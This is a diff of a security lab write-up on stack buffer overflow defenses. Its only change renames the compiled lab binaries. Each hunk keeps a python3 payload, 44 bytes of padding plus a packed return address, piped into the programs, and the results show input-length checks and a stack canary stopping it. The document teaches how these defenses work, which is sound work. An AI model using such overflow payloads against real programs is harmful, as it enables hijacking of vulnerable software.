@@ -188,14 +188,14 @@ Attack: SUCCESS (vulnerable!)
 
 ### Against Version 1 (Safe Code):
 ```
-python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*44 + pack("<I", 0x080491d6))' | ./vuln_v1_safe_code
+python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*44 + pack("<I", 0x080491d6))' | ./lab2_v1_safe_code
 Result: Input too long! Maximum 31 characters
 Attack: FAILED (rejected)
 ```
 
 ### Against Version 2 (Stack Canary):
 ```
-python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*44 + pack("<I", 0x080491d6))' | ./vuln_v2_canary
+python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*44 + pack("<I", 0x080491d6))' | ./lab2_v2_canary
 Result: *** stack smashing detected ***: terminated
         Aborted (core dumped)
 Attack: FAILED (detected and aborted)
@@ -203,7 +203,7 @@ Attack: FAILED (detected and aborted)
 
 ### Against Version 3 (All Defenses):
 ```
-python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*44 + pack("<I", 0x080491d6))' | ./vuln_v3_all_defenses
+python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*44 + pack("<I", 0x080491d6))' | ./lab2_v3_all_defenses
 Result: Input too long! Maximum 31 characters
 Attack: FAILED (rejected at first layer)
 ```
